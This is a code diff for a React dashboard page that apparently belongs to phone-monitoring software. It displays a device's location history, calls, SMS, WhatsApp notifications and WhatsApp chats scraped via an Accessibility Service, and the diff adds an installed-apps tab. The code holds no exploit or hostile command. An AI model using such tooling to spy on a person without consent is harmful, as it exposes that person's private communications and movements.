@@ -1,13 +1,13 @@
-import { useEffect, useRef, useState } from 'react'
+import { useEffect, useMemo, useRef, useState } from 'react'
 import { useParams, useNavigate } from 'react-router-dom'
 import { MapContainer, TileLayer, Marker, Popup, Polyline, useMap } from 'react-leaflet'
 import L from 'leaflet'
 import {
-  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats,
-  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto
+  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats, getInstalledApps,
+  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto, InstalledAppDto
 } from '../api/api'
 
-type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats'
+type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps'
 
 const iconSelected = L.divIcon({
   className: '',
@@ -36,6 +36,17 @@ function FlyToLocation({ target }: { target: [number, number] | null }) {
 const callType = (t: number) => t === 1 ? '\u{1F4F2} Incoming' : t === 2 ? '\u{1F4E4} Outgoing' : '\u274C Missed'
 const smsType  = (t: number) => t === 1 ? '\u{1F4E9} Inbox' : '\u{1F4E4} Sent'
 const fmt      = (ms: number) => new Date(ms).toLocaleString()
+const locKey   = (lat: number, lng: number) => `${lat.toFixed(2)},${lng.toFixed(2)}`
+
+function durationStr(ms: number): string {
+  const totalSec = Math.floor(ms / 1000)
+  if (totalSec < 60) return '< 1 min'
+  const mins = Math.floor(totalSec / 60)
+  if (mins < 60) return `${mins} min`
+  const h = Math.floor(mins / 60)
+  const m = mins % 60
+  return m === 0 ? `${h}h` : `${h}h ${m}m`
+}
 
 const TH = ({ children }: { children: React.ReactNode }) => (
   <th className="px-4 py-3 text-left text-xs font-semibold text-gray-500 uppercase tracking-wide bg-gray-50 border-b border-gray-200">
@@ -54,6 +65,7 @@ const TABS: { key: Tab; label: string }[] = [
   { key: 'sms',       label: '\u{1F4AC} SMS' },
   { key: 'wa_notifs', label: '\u{1F514} Notifications' },
   { key: 'wa_chats',  label: '\u{1F4AC} WA Chats' },
+  { key: 'apps',      label: '\u{1F4E6} Apps' },
 ]
 
 export default function DevicePage() {
@@ -68,6 +80,8 @@ export default function DevicePage() {
   const [sms,         setSms]         = useState<SmsDto[]>([])
   const [whatsapp,    setWhatsapp]    = useState<WhatsAppDto[]>([])
   const [waChats,     setWaChats]     = useState<WhatsAppChatDto[]>([])
+  const [apps,        setApps]        = useState<InstalledAppDto[]>([])
+  const [appSearch,   setAppSearch]   = useState('')
   const [activeChat,  setActiveChat]  = useState<string | null>(null)
   const msgEndRef = useRef<HTMLDivElement>(null)
 
@@ -77,6 +91,7 @@ export default function DevicePage() {
     getSmsLogs(deviceId).then(r => setSms(r.data)).catch(() => {})
     getWhatsApp(deviceId).then(r => setWhatsapp(r.data)).catch(() => {})
     getWhatsAppChats(deviceId).then(r => setWaChats(r.data)).catch(() => {})
+    getInstalledApps(deviceId).then(r => setApps(r.data)).catch(() => {})
   }, [deviceId])
 
   // Auto-scroll to bottom when active chat messages change
@@ -104,10 +119,27 @@ export default function DevicePage() {
   const latest = locations[0]
   const path: [number, number][] = locations.map(l => [l.latitude, l.longitude])
 
+  // Deduplicate consecutive locations with same lat/lng (2 decimal places)
+  const dedupedLocations = useMemo(() => {
+    if (locations.length === 0) return []
+    const chronological = [...locations].reverse()
+    const groups: Array<{ loc: LocationDto; since: number; until: number }> = []
+    for (const l of chronological) {
+      const key = locKey(l.latitude, l.longitude)
+      const last = groups[groups.length - 1]
+      if (groups.length === 0 || locKey(last.loc.latitude, last.loc.longitude) !== key) {
+        groups.push({ loc: l, since: l.timestamp, until: l.timestamp })
+      } else {
+        last.until = l.timestamp
+      }
+    }
+    return groups.reverse()
+  }, [locations])
+
   return (
     <div className="h-screen flex flex-col bg-gray-50">
       {/* Header */}
-      <header className="bg-white border-b border-gray-200 px-6 py-4 flex items-center gap-4 flex-shrink-0">
+      <header className="bg-white border-b border-gray-200 px-3 py-3 md:px-6 md:py-4 flex items-center gap-3 flex-shrink-0">
         <button
           onClick={() => nav('/')}
           className="text-indigo-600 hover:text-indigo-800 font-semibold text-sm transition-colors"
@@ -117,14 +149,14 @@ export default function DevicePage() {
         <h1 className="text-lg font-bold text-gray-900">Device #{deviceId}</h1>
       </header>
 
-      <main className={`flex-1 flex flex-col overflow-hidden ${tab === 'wa_chats' ? 'p-4' : 'p-6 overflow-y-auto'}`}>
+      <main className={`flex-1 flex flex-col overflow-hidden ${tab === 'wa_chats' || tab === 'map' ? 'p-2 md:p-4' : 'p-3 md:p-6 overflow-y-auto'}`}>
         {/* Tabs */}
-        <div className="flex flex-wrap gap-2 mb-5">
+        <div className="flex flex-wrap gap-1.5 md:gap-2 mb-3 md:mb-5 flex-shrink-0">
           {TABS.map(t => (
             <button
               key={t.key}
               onClick={() => setTab(t.key)}
-              className={`px-4 py-2 rounded-lg text-sm font-semibold border transition-colors ${
+              className={`px-3 py-1.5 md:px-4 md:py-2 rounded-lg text-xs md:text-sm font-semibold border transition-colors ${
                 tab === t.key
                   ? 'bg-indigo-600 text-white border-indigo-600'
                   : 'bg-white text-gray-600 border-gray-200 hover:border-indigo-300 hover:text-indigo-600'
@@ -137,12 +169,13 @@ export default function DevicePage() {
 
         {/* â”€â”€â”€ MAP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'map' && (
-          <>
-            <div className="rounded-xl overflow-hidden shadow-sm mb-5">
+          <div className="flex-1 flex flex-col md:flex-row gap-3 md:gap-4 min-h-0">
+            {/* Harita – mobilde ~50vh, desktop %70 */}
+            <div className="md:flex-[7] rounded-xl overflow-hidden shadow-sm flex-shrink-0 h-[50vh] md:h-auto">
               <MapContainer
                 center={latest ? [latest.latitude, latest.longitude] : [39.9, 32.8]}
                 zoom={latest ? 14 : 6}
-                style={{ height: 460 }}
+                style={{ height: '100%' }}
               >
                 <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                 <FlyToLocation target={selectedLoc ? [selectedLoc.latitude, selectedLoc.longitude] : null} />
@@ -165,38 +198,46 @@ export default function DevicePage() {
               </MapContainer>
             </div>
 
-            <h3 className="text-sm font-bold text-gray-700 mb-3">&#x1F4CD; Location History ({locations.length})</h3>
-            <div className="bg-white rounded-xl shadow-sm overflow-hidden">
-              <table className="w-full border-collapse">
-                <thead><tr><TH>#</TH><TH>Date & Time</TH><TH>Latitude</TH><TH>Longitude</TH><TH>Accuracy</TH></tr></thead>
-                <tbody>
-                  {locations.map((l, i) => {
-                    const isSel = selectedLoc?.timestamp === l.timestamp
-                    return (
-                      <tr
-                        key={i}
-                        onClick={() => setSelectedLoc(isSel ? null : l)}
-                        className={`cursor-pointer transition-colors ${
-                          isSel ? 'bg-red-50' : i === 0 ? 'bg-indigo-50' : 'hover:bg-gray-50'
-                        }`}
-                      >
-                        <TD>{isSel ? '\u{1F4CD} Selected' : i === 0 ? '\u{1F535} Latest' : i + 1}</TD>
-                        <TD>{fmt(l.timestamp)}</TD>
-                        <TD>{l.latitude.toFixed(6)}</TD>
-                        <TD>{l.longitude.toFixed(6)}</TD>
-                        <TD>{l.accuracy.toFixed(0)} m</TD>
-                      </tr>
-                    )
-                  })}
-                </tbody>
-              </table>
+            {/* Liste – mobilde alt, desktop %30 */}
+            <div className="md:flex-[3] flex flex-col min-h-0 flex-1">
+              <h3 className="text-sm font-bold text-gray-700 mb-2 flex-shrink-0">
+                &#x1F4CD; Location History ({dedupedLocations.length})
+              </h3>
+              <div className="bg-white rounded-xl shadow-sm overflow-y-auto flex-1">
+                <table className="w-full border-collapse text-xs">
+                  <thead className="sticky top-0 z-10">
+                    <tr><TH>#</TH><TH>Date & Time</TH><TH>Accuracy</TH><TH>Duration</TH></tr>
+                  </thead>
+                  <tbody>
+                    {dedupedLocations.map(({ loc: l, since, until }, i) => {
+                      const isSel = selectedLoc?.timestamp === l.timestamp
+                      const duration = until - since
+                      return (
+                        <tr
+                          key={i}
+                          onClick={() => setSelectedLoc(isSel ? null : l)}
+                          className={`cursor-pointer transition-colors ${
+                            isSel ? 'bg-red-50' : i === 0 ? 'bg-indigo-50' : 'hover:bg-gray-50'
+                          }`}
+                        >
+                          <TD>{isSel ? '\u{1F4CD}' : i === 0 ? '\u{1F535}' : i + 1}</TD>
+                          <TD>{fmt(l.timestamp)}</TD>
+                          <TD>{l.accuracy.toFixed(0)} m</TD>
+                          <TD>{duration > 0 ? durationStr(duration) : '—'}</TD>
+                        </tr>
+                      )
+                    })}
+                  </tbody>
+                </table>
+              </div>
             </div>
-          </>
+          </div>
         )}
 
         {/* â”€â”€â”€ CALLS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'calls' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
+            <div className="overflow-x-auto">
             <table className="w-full border-collapse">
               <thead><tr><TH>Contact</TH><TH>Number</TH><TH>Type</TH><TH>Duration</TH><TH>Date</TH></tr></thead>
               <tbody>
@@ -212,12 +253,14 @@ export default function DevicePage() {
                 {calls.length === 0 && <tr><td colSpan={5} className="px-4 py-8 text-center text-gray-400 text-sm">No call logs yet.</td></tr>}
               </tbody>
             </table>
+            </div>
           </div>
         )}
 
         {/* â”€â”€â”€ SMS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'sms' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
+            <div className="overflow-x-auto">
             <table className="w-full border-collapse">
               <thead><tr><TH>From/To</TH><TH>Message</TH><TH>Type</TH><TH>Date</TH></tr></thead>
               <tbody>
@@ -232,12 +275,14 @@ export default function DevicePage() {
                 {sms.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No SMS logs yet.</td></tr>}
               </tbody>
             </table>
+            </div>
           </div>
         )}
 
         {/* â”€â”€â”€ WA NOTIFS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */}
         {tab === 'wa_notifs' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
+            <div className="overflow-x-auto">
             <table className="w-full border-collapse">
               <thead><tr><TH>App</TH><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
               <tbody>
@@ -260,6 +305,7 @@ export default function DevicePage() {
                 {whatsapp.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
               </tbody>
             </table>
+            </div>
           </div>
         )}
 
@@ -267,14 +313,14 @@ export default function DevicePage() {
         {/* WA CHATS */}
         {tab === 'wa_chats' && (
           waChats.length === 0 ? (
-            <div className="bg-white rounded-xl shadow-sm flex items-center justify-center flex-1 text-gray-400 text-sm">
+            <div className="bg-white rounded-xl shadow-sm flex items-center justify-center flex-1 text-gray-400 text-sm text-center px-4">
               No chat messages yet. Enable Accessibility Service and open a WhatsApp chat.
             </div>
           ) : (
-            <div className="bg-white rounded-xl shadow-sm overflow-hidden flex flex-1 min-h-0">
-              {/* Left: contact list */}
-              <div className="w-72 flex-shrink-0 border-r border-gray-100 flex flex-col">
-                <div className="px-4 py-3 bg-[#f0f2f5] border-b border-gray-200">
+            <div className="bg-white rounded-xl shadow-sm overflow-hidden flex flex-col md:flex-row flex-1 min-h-0">
+              {/* Contacts: mobilde %40 yükseklik, desktopda 288px genişlik */}
+              <div className="flex-[2] md:flex-none md:w-72 border-b md:border-b-0 md:border-r border-gray-100 flex flex-col min-h-0">
+                <div className="px-4 py-3 bg-[#f0f2f5] border-b border-gray-200 flex-shrink-0">
                   <p className="text-sm font-semibold text-gray-700">Conversations</p>
                   <p className="text-xs text-gray-400">{chatList.length} chat{chatList.length !== 1 ? 's' : ''}</p>
                 </div>
@@ -304,17 +350,17 @@ export default function DevicePage() {
                 </div>
               </div>
 
-              {/* Right: chat window */}
+              {/* Chat paneli: mobilde %60 yükseklik, desktopda kalan alan */}
               {activeChat === null ? (
-                <div className="flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#f0f2f5]">
+                <div className="flex-[3] md:flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#f0f2f5] min-h-0">
                   <div className="text-5xl mb-3">&#x1F4AC;</div>
                   <p className="text-sm font-medium">Select a conversation</p>
                 </div>
               ) : (
-                <div className="flex-1 flex flex-col min-w-0">
+                <div className="flex-[3] md:flex-1 flex flex-col min-h-0 min-w-0">
                   {/* Chat header */}
-                  <div className="px-4 py-3 bg-[#f0f2f5] border-b border-gray-200 flex items-center gap-3 flex-shrink-0">
-                    <div className="w-9 h-9 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm">
+                  <div className="px-3 py-3 md:px-4 bg-[#f0f2f5] border-b border-gray-200 flex items-center gap-3 flex-shrink-0">
+                    <div className="w-9 h-9 rounded-full bg-emerald-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
                       {activeChat.charAt(0).toUpperCase()}
                     </div>
                     <div>
@@ -325,7 +371,7 @@ export default function DevicePage() {
 
                   {/* Messages */}
                   <div
-                    className="flex-1 overflow-y-auto px-4 py-4 space-y-1"
+                    className="flex-1 overflow-y-auto px-3 md:px-4 py-4 space-y-1 min-h-0"
                     style={{ backgroundColor: '#efeae2' }}
                   >
                     {activeMsgs.map((m, i) => {
@@ -334,7 +380,7 @@ export default function DevicePage() {
                       return (
                         <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
                           <div
-                            className={`max-w-xs lg:max-w-md xl:max-w-lg px-3 py-2 rounded-lg shadow-sm text-sm relative ${
+                            className={`max-w-[75vw] md:max-w-xs lg:max-w-md xl:max-w-lg px-3 py-2 rounded-lg shadow-sm text-sm relative ${
                               isMe
                                 ? 'bg-[#d9fdd3] text-gray-800 rounded-br-none'
                                 : 'bg-white text-gray-800 rounded-bl-none'
@@ -358,8 +404,62 @@ export default function DevicePage() {
             </div>
           )
         )}
+
+        {/* ─── APPS ───────────────────────────────────────────── */}
+        {tab === 'apps' && (
+          <div className="flex flex-col gap-3">
+            <div className="flex-shrink-0">
+              <input
+                type="search"
+                placeholder="Search apps…"
+                value={appSearch}
+                onChange={e => setAppSearch(e.target.value)}
+                className="w-full md:w-72 px-3 py-2 text-sm border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-300"
+              />
+              <span className="ml-3 text-xs text-gray-400">
+                {apps.filter(a =>
+                  a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
+                  a.packageName.toLowerCase().includes(appSearch.toLowerCase())
+                ).length} / {apps.length} apps
+              </span>
+            </div>
+            <div className="bg-white rounded-xl shadow-sm overflow-hidden">
+              <div className="overflow-x-auto">
+                <table className="w-full border-collapse">
+                  <thead>
+                    <tr><TH>Icon</TH><TH>App Name</TH><TH>Package</TH><TH>Version</TH><TH>Installed</TH><TH>Last Seen</TH></tr>
+                  </thead>
+                  <tbody>
+                    {apps
+                      .filter(a =>
+                        a.appName.toLowerCase().includes(appSearch.toLowerCase()) ||
+                        a.packageName.toLowerCase().includes(appSearch.toLowerCase())
+                      )
+                      .map((a, i) => (
+                        <tr key={i} className="hover:bg-gray-50">
+                          <TD>
+                            {a.iconBase64
+                              ? <img src={`data:image/png;base64,${a.iconBase64}`} alt="" className="w-8 h-8 rounded" />
+                              : <span className="text-gray-300 text-lg">📦</span>}
+                          </TD>
+                          <TD className="font-medium">{a.appName}</TD>
+                          <TD className="font-mono text-xs text-gray-500">{a.packageName}</TD>
+                          <TD>{a.version || '—'}</TD>
+                          <TD>{fmt(a.installedAt)}</TD>
+                          <TD>{fmt(a.lastSeenAt)}</TD>
+                        </tr>
+                      ))
+                    }
+                    {apps.length === 0 && (
+                      <tr><td colSpan={6} className="px-4 py-8 text-center text-gray-400 text-sm">No app data yet. Waiting for device sync.</td></tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+        )}
       </main>
     </div>
   )
 }
-
